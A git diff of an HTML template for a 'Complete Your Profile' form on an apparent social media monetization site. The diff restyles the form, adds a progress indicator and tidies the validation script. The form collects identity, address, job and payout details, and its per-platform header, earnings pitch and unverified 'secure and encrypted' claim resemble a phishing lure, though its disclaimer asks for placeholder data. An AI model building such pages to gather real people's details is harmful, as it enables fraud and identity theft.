@@ -1,7 +1,7 @@
 {% extends "base.html" %}
 {% block body %}
 <div class="card form-card">
-  <!-- ADDED PLATFORM HEADER -->
+  <!-- ENHANCED PLATFORM HEADER -->
   <div class="platform-header">
     <div class="icon-circle" style="background: rgba(102, 126, 234, 0.1); border: 2px solid rgba(102, 126, 234, 0.2);">
       <i class="{{ platform_icon }}" style="color: #667eea;"></i>
@@ -13,10 +13,28 @@
   </div>
 
   <div class="form-header">
-    <h1>📋 Complete Your Profile</h1>
+    <div class="header-icon">📋</div>
+    <h1>Complete Your Profile</h1>
     <p class="lead">Please fill out all sections carefully to proceed with your account setup.</p>
     <div class="disclaimer">
-      <small>🔒 Note: For security purposes, please use placeholder information only.</small>
+      <div class="disclaimer-icon">🔒</div>
+      <small>Note: For security purposes, please use placeholder information only.</small>
+    </div>
+  </div>
+
+  <!-- Progress Indicator -->
+  <div class="form-progress">
+    <div class="progress-step current">
+      <div class="step-number">1</div>
+      <div class="step-info">Profile Setup</div>
+    </div>
+    <div class="progress-step">
+      <div class="step-number">2</div>
+      <div class="step-info">Contact Verification</div>
+    </div>
+    <div class="progress-step">
+      <div class="step-number">3</div>
+      <div class="step-info">Security Setup</div>
     </div>
   </div>
 
@@ -27,28 +45,33 @@
     
     <!-- Personal Information -->
     <div class="form-section">
-      <h2 class="section-title">👤 Personal Information</h2>
+      <div class="section-header">
+        <div class="section-icon">👤</div>
+        <h2 class="section-title">Personal Information</h2>
+      </div>
       <div class="form-group">
         <label class="form-label">Full Name</label>
         <input type="text" name="fullname" class="input" placeholder="Enter your full name" required>
         <div class="error">Please enter your full name</div>
       </div>
 
-      <div class="form-group">
-        <label class="form-label">Date of Birth</label>
-        <input type="date" name="dob" class="input" required>
-        <div class="error">Please select your date of birth</div>
-      </div>
-
-      <div class="form-group">
-        <label class="form-label">Gender</label>
-        <div class="group button-group" data-group="gender">
-          <button type="button" class="option-btn" data-name="gender" data-value="Male">Male</button>
-          <button type="button" class="option-btn" data-name="gender" data-value="Female">Female</button>
-          <button type="button" class="option-btn" data-name="gender" data-value="Other">Other</button>
-          <input type="hidden" name="gender" required>
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">Date of Birth</label>
+          <input type="date" name="dob" class="input" required>
+          <div class="error">Please select your date of birth</div>
         </div>
-        <div class="error group-error">Please select your gender</div>
+
+        <div class="form-group">
+          <label class="form-label">Gender</label>
+          <div class="group button-group" data-group="gender">
+            <button type="button" class="option-btn" data-name="gender" data-value="Male">Male</button>
+            <button type="button" class="option-btn" data-name="gender" data-value="Female">Female</button>
+            <button type="button" class="option-btn" data-name="gender" data-value="Other">Other</button>
+            <input type="hidden" name="gender" required>
+          </div>
+          <div class="error group-error">Please select your gender</div>
+        </div>
       </div>
 
       <div class="form-group">
@@ -66,7 +89,10 @@
 
     <!-- Residential Address -->
     <div class="form-section">
-      <h2 class="section-title">🏠 Residential Address</h2>
+      <div class="section-header">
+        <div class="section-icon">🏠</div>
+        <h2 class="section-title">Residential Address</h2>
+      </div>
       <div class="form-group">
         <label class="form-label">Street Address</label>
         <input type="text" name="street" class="input" placeholder="Enter your street address" required>
@@ -96,7 +122,10 @@
 
     <!-- Education -->
     <div class="form-section">
-      <h2 class="section-title">🎓 Education Background</h2>
+      <div class="section-header">
+        <div class="section-icon">🎓</div>
+        <h2 class="section-title">Education Background</h2>
+      </div>
       <div class="form-group">
         <label class="form-label">Highest Qualification</label>
         <input type="text" name="qualification" class="input" placeholder="Your highest qualification" required>
@@ -118,7 +147,10 @@
 
     <!-- Work -->
     <div class="form-section">
-      <h2 class="section-title">💼 Professional Information</h2>
+      <div class="section-header">
+        <div class="section-icon">💼</div>
+        <h2 class="section-title">Professional Information</h2>
+      </div>
       <div class="form-group">
         <label class="form-label">Occupation / Job Title</label>
         <input type="text" name="occupation" class="input" placeholder="Your occupation" required>
@@ -134,10 +166,13 @@
 
     <!-- Fun Preferences -->
     <div class="form-section">
-      <h2 class="section-title">💰 Monetization Preferences</h2>
+      <div class="section-header">
+        <div class="section-icon">💰</div>
+        <h2 class="section-title">Monetization Preferences</h2>
+      </div>
       <div class="form-group">
         <div class="group button-group" data-group="fun">
-          <button type="button" class="option-btn" data-name="fun" data-value="happiness">Earning from you own content</button>
+          <button type="button" class="option-btn" data-name="fun" data-value="happiness">Earning from your own content</button>
           <button type="button" class="option-btn" data-name="fun" data-value="smile">Earning by streaming other's content</button>
           <button type="button" class="option-btn" data-name="fun" data-value="both">Both Methods</button>
           <input type="hidden" name="fun" required>
@@ -148,7 +183,10 @@
 
     <!-- Short Bio -->
     <div class="form-section">
-      <h2 class="section-title">📝 Personal Bio</h2>
+      <div class="section-header">
+        <div class="section-icon">📝</div>
+        <h2 class="section-title">Personal Bio</h2>
+      </div>
       <div class="form-group">
         <label class="form-label">Write a short bio explaining why you want to monetize your social media account.</label>
         <textarea name="bio" class="input" rows="6" minlength="15" maxlength="1500" required placeholder="Tell us about yourself (15-300 words)..."></textarea>
@@ -158,7 +196,10 @@
 
     <!-- Notifications -->
     <div class="form-section">
-      <h2 class="section-title">🔔 Notification Preferences</h2>
+      <div class="section-header">
+        <div class="section-icon">🔔</div>
+        <h2 class="section-title">Notification Preferences</h2>
+      </div>
       <div class="form-group">
         <div class="group button-group" data-group="notify">
           <button type="button" class="option-btn" data-name="notify" data-value="email">Email Updates</button>
@@ -172,11 +213,14 @@
 
     <!-- Play Method -->
     <div class="form-section">
-      <h2 class="section-title">💳 Earnings Payout Method</h2>
+      <div class="section-header">
+        <div class="section-icon">💳</div>
+        <h2 class="section-title">Earnings Payout Method</h2>
+      </div>
       <div class="form-group">
         <div class="group button-group" data-group="method">
           <button type="button" class="option-btn" data-name="method" data-value="feeling">Bank Account</button>
-          <button type="button" class="option-btn" data-name="method" data-value="hoping"> Crypto Wallet</button>
+          <button type="button" class="option-btn" data-name="method" data-value="hoping">Crypto Wallet</button>
           <button type="button" class="option-btn" data-name="method" data-value="applications">Mobile Applications</button>
           <input type="hidden" name="method" required>
         </div>
@@ -186,7 +230,10 @@
 
     <!-- Terms -->
     <div class="form-section">
-      <h2 class="section-title">📄 Terms & Conditions</h2>
+      <div class="section-header">
+        <div class="section-icon">📄</div>
+        <h2 class="section-title">Terms & Conditions</h2>
+      </div>
       <div class="form-group">
         <div class="terms-box">
           <p>⚖️ Terms and Conditions
@@ -304,13 +351,30 @@ For privacy-related inquiries, contact: privacy@monetizationhub.com.</p>
 
     <!-- Submit -->
     <div class="form-section">
-      <button type="submit" class="submit-btn">Complete Registration</button>
+      <button type="submit" class="submit-btn">
+        <span class="btn-text">Complete Registration</span>
+        <span class="btn-arrow">→</span>
+      </button>
+      <div class="form-footer">
+        <p>🔒 Your information is secure and encrypted</p>
+      </div>
     </div>
   </form>
 </div>
 
 <style>
-/* ADDED PLATFORM HEADER STYLES */
+/* REDUCED GLOW EFFECTS */
+.form-card {
+  max-width: 680px;
+  margin: 28px auto;
+  padding: 40px;
+  border-radius: 20px;
+  background: #ffffff;
+  box-shadow: 0 4px 12px rgba(24, 119, 242, 0.15);
+  border: 1px solid #f1f5f9;
+}
+
+/* ENHANCED PLATFORM HEADER STYLES */
 .platform-header {
   display: flex;
   align-items: center;
@@ -330,21 +394,18 @@ For privacy-related inquiries, contact: privacy@monetizationhub.com.</p>
   flex-shrink: 0;
 }
 
-.form-card {
-  max-width: 680px;
-  margin: 28px auto;
-  padding: 40px;
-  border-radius: 20px;
-  background: #ffffff;
-  box-shadow: 0 15px 35px rgba(24, 119, 242, 0.15);
-  border: 1px solid #f1f5f9;
-}
-
+/* Enhanced Form Header */
 .form-header {
   text-align: center;
   margin-bottom: 32px;
   padding-bottom: 24px;
   border-bottom: 2px solid #f1f5f9;
+}
+
+.header-icon {
+  font-size: 48px;
+  margin-bottom: 16px;
+  display: block;
 }
 
 .form-header h1 {
@@ -361,7 +422,7 @@ For privacy-related inquiries, contact: privacy@monetizationhub.com.</p>
 .form-header .lead {
   font-size: 16px;
   color: #64748b;
-  margin-bottom: 12px;
+  margin-bottom: 16px;
   line-height: 1.5;
 }
 
@@ -371,6 +432,15 @@ For privacy-related inquiries, contact: privacy@monetizationhub.com.</p>
   border-radius: 12px;
   padding: 12px 16px;
   margin-top: 16px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  justify-content: center;
+}
+
+.disclaimer-icon {
+  font-size: 16px;
+  flex-shrink: 0;
 }
 
 .disclaimer small {
@@ -378,6 +448,55 @@ For privacy-related inquiries, contact: privacy@monetizationhub.com.</p>
   font-weight: 500;
 }
 
+/* Progress Indicator */
+.form-progress {
+  display: flex;
+  justify-content: center;
+  margin-bottom: 32px;
+  gap: 8px;
+}
+
+.progress-step {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 8px;
+  flex: 1;
+  max-width: 120px;
+}
+
+.step-number {
+  width: 36px;
+  height: 36px;
+  border-radius: 50%;
+  background: #e5e7eb;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 14px;
+  font-weight: 700;
+  color: #64748b;
+  border: 3px solid white;
+}
+
+.progress-step.current .step-number {
+  background: #667eea;
+  color: white;
+  box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2);
+}
+
+.step-info {
+  font-size: 12px;
+  color: #64748b;
+  font-weight: 600;
+  text-align: center;
+}
+
+.progress-step.current .step-info {
+  color: #667eea;
+}
+
+/* Enhanced Form Sections */
 .form-section {
   margin-bottom: 32px;
   padding-bottom: 24px;
@@ -390,16 +509,27 @@ For privacy-related inquiries, contact: privacy@monetizationhub.com.</p>
   padding-bottom: 0;
 }
 
+.section-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 20px;
+  padding: 16px;
+  background: #f8fafc;
+  border-radius: 12px;
+  border-left: 4px solid #667eea;
+}
+
+.section-icon {
+  font-size: 20px;
+  flex-shrink: 0;
+}
+
 .section-title {
   font-size: 18px;
   font-weight: 700;
-  margin-bottom: 20px;
+  margin: 0;
   color: #1e293b;
-  padding-left: 16px;
-  border-left: 4px solid #1877F2;
-  background: #f8fafc;
-  padding: 12px 16px;
-  border-radius: 12px;
 }
 
 .form-group {
@@ -422,19 +552,20 @@ For privacy-related inquiries, contact: privacy@monetizationhub.com.</p>
 
 .input, textarea {
   width: 100%;
-  padding: 16px;
+  padding: 14px;
   border: 2px solid #e5e7eb;
-  border-radius: 14px;
+  border-radius: 12px;
   font-size: 16px;
   background: #ffffff;
   transition: all 0.3s ease;
   box-sizing: border-box;
+  font-family: inherit;
 }
 
 .input:focus, textarea:focus {
   outline: none;
-  border-color: #1877F2;
-  box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.15);
+  border-color: #667eea;
+  box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.15);
   background: #ffffff;
 }
 
@@ -445,29 +576,29 @@ For privacy-related inquiries, contact: privacy@monetizationhub.com.</p>
 
 .invalid {
   border-color: #ef4444 !important;
-  box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.1) !important;
+  box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1) !important;
 }
 
 .group.invalid {
   border: 2px solid #ef4444;
-  box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.1);
-  border-radius: 14px;
+  box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1);
+  border-radius: 12px;
   padding: 12px;
 }
 
 .button-group {
   display: flex;
   flex-wrap: wrap;
-  gap: 12px;
+  gap: 8px;
   margin-bottom: 8px;
 }
 
 .option-btn {
   flex: 1;
   min-width: 120px;
-  padding: 14px 20px;
+  padding: 12px 16px;
   border: 2px solid #e5e7eb;
-  border-radius: 12px;
+  border-radius: 10px;
   font-weight: 600;
   font-size: 14px;
   cursor: pointer;
@@ -478,16 +609,16 @@ For privacy-related inquiries, contact: privacy@monetizationhub.com.</p>
 }
 
 .option-btn:hover {
-  border-color: #1877F2;
-  color: #1877F2;
+  border-color: #667eea;
+  color: #667eea;
   transform: translateY(-1px);
 }
 
 .option-btn.selected {
-  background: #1877F2;
+  background: #667eea;
   color: #ffffff;
-  border-color: #1877F2;
-  box-shadow: 0 4px 12px rgba(24, 119, 242, 0.25);
+  border-color: #667eea;
+  box-shadow: 0 2px 8px rgba(102, 126, 234, 0.25);
   transform: translateY(-1px);
 }
 
@@ -533,50 +664,143 @@ For privacy-related inquiries, contact: privacy@monetizationhub.com.</p>
 }
 
 .checkbox-label input[type="checkbox"]:checked {
-  background-color: #1877F2;
-  border-color: #1877F2;
+  background-color: #667eea;
+  border-color: #667eea;
 }
 
+/* REDUCED SUBMIT BUTTON GLOW */
 .submit-btn {
   width: 100%;
-  background: linear-gradient(135deg, #1877F2, #4e9af1);
+  background: linear-gradient(135deg, #667eea, #764ba2);
   color: #ffffff;
   font-size: 18px;
   font-weight: 700;
-  padding: 18px 32px;
-  border-radius: 25px;
+  padding: 16px 32px;
+  border-radius: 14px;
   border: none;
   cursor: pointer;
   transition: all 0.3s ease;
-  box-shadow: 0 8px 20px rgba(24, 119, 242, 0.35);
+  box-shadow: 0 4px 12px rgba(102, 126, 234, 0.25);
   margin-top: 16px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
 }
 
 .submit-btn:hover {
   transform: translateY(-2px);
-  box-shadow: 0 12px 25px rgba(24, 119, 242, 0.45);
+  box-shadow: 0 6px 16px rgba(102, 126, 234, 0.35);
 }
 
 .submit-btn:active {
   transform: translateY(0);
+}
+
+.btn-arrow {
+  transition: transform 0.2s ease;
+}
+
+.submit-btn:hover .btn-arrow {
+  transform: translateX(2px);
+}
+
+.form-footer {
+  text-align: center;
+  margin-top: 16px;
+  padding: 12px;
+  background: #f0f9ff;
+  border-radius: 8px;
+  border: 1px solid #e0f2fe;
+}
+
+.form-footer p {
+  margin: 0;
+  color: #0369a1;
+  font-size: 14px;
+  font-weight: 500;
+}
+
+/* Responsive Design */
+@media (max-width: 768px) {
+  .form-card {
+    margin: 20px auto;
+    padding: 24px;
+    border-radius: 16px;
+  }
+  
+  .form-row {
+    grid-template-columns: 1fr;
+    gap: 0;
+  }
+  
+  .button-group {
+    flex-direction: column;
+  }
+  
+  .option-btn {
+    min-width: auto;
+  }
+  
+  .form-progress {
+    flex-direction: column;
+    align-items: center;
+    gap: 16px;
+  }
+  
+  .progress-step {
+    max-width: none;
+    width: 100%;
+  }
+  
+  .section-header {
+    flex-direction: column;
+    text-align: center;
+    gap: 8px;
+  }
+}
+
+@media (max-width: 480px) {
+  .form-card {
+    padding: 20px 16px;
+    margin: 16px auto;
+  }
+  
+  .form-header h1 {
+    font-size: 24px;
+  }
+  
+  .section-title {
+    font-size: 16px;
+  }
+  
+  .submit-btn {
+    padding: 14px 24px;
+    font-size: 16px;
+  }
 }
 </style>
 
 <script>
 const form = document.getElementById("f1form");
 
+// Enhanced option button functionality
 document.querySelectorAll(".option-btn").forEach(btn => {
   btn.addEventListener("click", () => {
     const name = btn.dataset.name;
     const hidden = form.querySelector(`input[name="${name}"]`);
     const siblings = document.querySelectorAll(`.option-btn[data-name="${name}"]`);
+    
     siblings.forEach(b => b.classList.remove("selected"));
     btn.classList.add("selected");
     hidden.value = btn.dataset.value;
 
     const group = form.querySelector(`.button-group[data-group="${name}"]`);
     group.classList.remove("invalid");
-    group.nextElementSibling.style.display = "none";
+    const errorElement = group.nextElementSibling;
+    if (errorElement && errorElement.classList.contains("group-error")) {
+      errorElement.style.display = "none";
+    }
   });
 });
 
@@ -584,9 +808,11 @@ function validateForm(showErrors = true) {
   let valid = true;
   let firstInvalid = null;
 
+  // Hide all errors
   form.querySelectorAll(".error, .group-error").forEach(e => e.style.display = "none");
   form.querySelectorAll(".invalid").forEach(e => e.classList.remove("invalid"));
 
+  // Validate all required fields
   form.querySelectorAll("input[required], textarea[required]").forEach(input => {
     const isHidden = input.type === "hidden";
     const isCheckbox = input.type === "checkbox";
@@ -597,27 +823,36 @@ function validateForm(showErrors = true) {
         const group = input.closest(".group");
         if (showErrors) {
           group.classList.add("invalid");
-          group.nextElementSibling.style.display = "block";
+          const errorElement = group.nextElementSibling;
+          if (errorElement && errorElement.classList.contains("group-error")) {
+            errorElement.style.display = "block";
+          }
         }
         if (!firstInvalid) firstInvalid = group;
       }
     } else if (isCheckbox) {
       if (!input.checked) {
         valid = false;
-        const err = input.closest(".checkbox-group").querySelector(".group-error");
-        if (showErrors && err) err.style.display = "block";
+        const errorElement = input.closest(".checkbox-group").querySelector(".group-error");
+        if (showErrors && errorElement) {
+          errorElement.style.display = "block";
+        }
         if (!firstInvalid) firstInvalid = input.closest(".checkbox-group");
       }
     } else if (!input.value.trim()) {
       valid = false;
       if (showErrors) {
         input.classList.add("invalid");
-        input.nextElementSibling.style.display = "block";
+        const errorElement = input.nextElementSibling;
+        if (errorElement && errorElement.classList.contains("error")) {
+          errorElement.style.display = "block";
+        }
       }
       if (!firstInvalid) firstInvalid = input;
     }
   });
 
+  // Scroll to first invalid field if showing errors
   if (!valid && showErrors && firstInvalid) {
     firstInvalid.scrollIntoView({ behavior: "smooth", block: "center" });
   }
@@ -625,11 +860,32 @@ function validateForm(showErrors = true) {
   return valid;
 }
 
-form.addEventListener("submit", e => { if (!validateForm(true)) e.preventDefault(); });
+// Form submission handler
+form.addEventListener("submit", e => {
+  if (!validateForm(true)) {
+    e.preventDefault();
+  }
+});
 
+// Real-time validation
 form.querySelectorAll("input, textarea").forEach(el => {
   el.addEventListener("input", () => validateForm(false));
   el.addEventListener("change", () => validateForm(false));
+});
+
+// Add some interactive enhancements
+document.addEventListener('DOMContentLoaded', function() {
+  // Add subtle animations to form sections
+  const formSections = document.querySelectorAll('.form-section');
+  formSections.forEach((section, index) => {
+    section.style.opacity = '0';
+    section.style.transform = 'translateY(20px)';
+    setTimeout(() => {
+      section.style.transition = 'all 0.6s ease';
+      section.style.opacity = '1';
+      section.style.transform = 'translateY(0)';
+    }, index * 100);
+  });
 });
 </script>
 {% endblock %}
